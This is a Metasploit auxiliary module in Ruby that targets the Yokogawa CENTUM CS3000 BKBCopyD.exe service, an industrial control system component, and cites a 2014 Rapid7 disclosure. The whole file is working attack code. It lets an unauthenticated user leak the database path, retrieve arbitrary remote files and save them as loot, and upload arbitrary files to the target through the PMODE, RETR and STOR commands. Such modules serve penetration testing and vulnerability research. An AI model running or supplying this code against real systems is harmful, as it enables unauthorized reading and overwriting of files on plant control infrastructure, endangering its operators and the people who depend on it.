# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::Remote::TcpServer
include Msf::Auxiliary::Report
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Yokogawa BKBCopyD.exe Client&#039;,
&#039;Description&#039; => %q{
This module allows an unauthenticated user to interact with the Yokogawa
CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
operations.
},
&#039;Author&#039; =>
[ &#039;Unknown&#039; ],
&#039;References&#039; =>
[
[ &#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access&#039;]
],
&#039;Actions&#039; =>
[
[&#039;PMODE&#039;, { &#039;Description&#039; => &#039;Leak the current database&#039; }],
[&#039;RETR&#039;, { &#039;Description&#039; => &#039;Retrieve remote file&#039; }],
[&#039;STOR&#039;, { &#039;Description&#039; => &#039;Store remote file&#039; }]
],
&#039;DisclosureDate&#039; => &#039;Aug 9 2014&#039;,
&#039;DefaultTarget&#039; => 0))
register_options(
[
Opt::RPORT(20111),
OptString.new(&#039;RPATH&#039;, [ false, &#039;The Remote Path (required to RETR and STOR)&#039;, "" ]),
OptPath.new(&#039;LPATH&#039;, [ false, &#039;The Local Path (required to STOR)&#039; ])
], self.class)
end
def srvport
@srvport
end
def run
exploit
end
def exploit
@srvport = rand(1024..65535)
print_status("#{@srvport}")
# We make the client connection before giving control to the TCP Server
# in order to release the src port, so the server can start correctly
case action.name
when &#039;PMODE&#039;
print_status("Sending PMODE packet...")
data = "PMODE MR_DBPATH\n"
res = send_pkt(data)
if res and res =~ /^210/
print_good("Success: #{res}")
else
print_error("Failed...")
end
return
when &#039;RETR&#039;
data = "RETR #{datastore[&#039;RPATH&#039;]}\n"
print_status("Sending RETR packet...")
res = send_pkt(data)
return unless res and res =~ /^150/
when &#039;STOR&#039;
data = "STOR #{datastore[&#039;RPATH&#039;]}\n"
print_status("Sending STOR packet...")
res = send_pkt(data)
return unless res and res =~ /^150/
else
print_error("Incorrect action")
return
end
super # TCPServer :)
end
def send_pkt(data)
connect(true, {&#039;CPORT&#039; => @srvport})
sock.put(data)
data = sock.get_once
disconnect
return data
end
def valid_response?(data)
return false unless !!data
return false unless data =~ /500 &#039;yyparse error&#039;: command not understood/
return true
end
def on_client_connect(c)
if action.name == &#039;STOR&#039;
contents = ""
File.new(datastore[&#039;LPATH&#039;], "rb") { |f| contents = f.read }
print_status("#{c.peerhost} - Sending data...")
c.put(contents)
self.service.close
self.service.stop
end
end
def on_client_data(c)
print_status("#{c.peerhost} - Getting data...")
data = c.get_once
return unless data
if @store_path.blank?
@store_path = store_loot("yokogawa.cs3000.file", "application/octet-stream", rhost, data, datastore[&#039;PATH&#039;])
print_good("#{@store_path} saved!")
else
File.open(@store_path, "ab") { |f| f.write(data) }
print_good("More data on #{@store_path}")
end
end
def on_client_close(c)
stop_service
end
end

